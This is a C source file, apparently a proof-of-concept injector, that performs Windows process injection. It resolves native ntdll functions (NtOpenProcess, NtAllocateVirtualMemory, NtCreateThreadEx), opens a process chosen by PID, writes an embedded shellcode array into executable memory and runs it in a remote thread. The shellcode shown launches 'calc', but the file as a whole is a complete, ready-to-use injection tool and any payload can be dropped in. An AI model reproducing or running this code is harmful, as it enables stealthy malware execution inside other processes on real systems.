#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include "ntapi.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

unsigned char payload[] = {
                        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
                        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
                        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
                        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
                        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
                        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
                        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
                        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
                        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
                        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
                        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
                        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
                        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
                        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
                        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
                        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
                        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
                        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
                        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
                        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
                        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
                        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
                        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

SIZE_T sPayload = sizeof(payload);

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("[!] Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    HANDLE hProcess, hThread;
    DWORD PID;
    PID = atoi(argv[1]);
    LPVOID address = NULL;
    NTSTATUS status;
    HMODULE hntdll;

    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)PID, NULL };

    hntdll = GetModuleHandleW(L"ntdll.dll");
    if (hntdll == NULL) {
        printf("[~~] Error in getting handle to ntdll.dll: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] Loaded ntdll.dll successfully\n");
    }

    NtOpenProcess r00topen = (NtOpenProcess)GetProcAddress(hntdll, "NtOpenProcess");
    if (r00topen == NULL) {
        printf("[~~] Error in finding NtOpenProcess address: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] NtOpenProcess address found: %p\n", r00topen);
    }

    NtAllocateVirtualMemory r00tmemory = (NtAllocateVirtualMemory)GetProcAddress(hntdll, "NtAllocateVirtualMemory");
    if (r00tmemory == NULL) {
        printf("[~~] Error in finding NtAllocateVirtualMemory address: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] NtAllocateVirtualMemory address found: %p\n", r00tmemory);
    }

    NtCreateThreadEx r00thread = (NtCreateThreadEx)GetProcAddress(hntdll, "NtCreateThreadEx");
    if (r00thread == NULL) {
        printf("[~~] Error in finding NtCreateThreadEx address: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] NtCreateThreadEx address found: %p\n", r00thread);
    }

    NtClose r00tclose = (NtClose)GetProcAddress(hntdll, "NtClose");
    if (r00tclose == NULL) {
        printf("[~~] Error in finding NtClose address: %lu\n", GetLastError());
        return 1;
    } else {
        printf("[+] NtClose address found: %p\n", r00tclose);
    }

    status = r00topen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Opening Process: %lu\n", GetLastError());
        return 1;
    }

    SIZE_T regionSize = sPayload;
    status = r00tmemory(hProcess, &address, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Allocating Memory: %lu\n", GetLastError());
        return 1;
    }

    if (!WriteProcessMemory(hProcess, address, payload, sPayload, NULL)) {
        printf("[!] ERROR in Writing Memory: %lu\n", GetLastError());
        return 1;
    }

    status = r00thread(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, address, NULL, 0, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        printf("[!] ERROR in Creating Remote Thread: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Successfully injected and created remote thread!\n");

    r00tclose(hThread);
    r00tclose(hProcess);
    return 0;
}
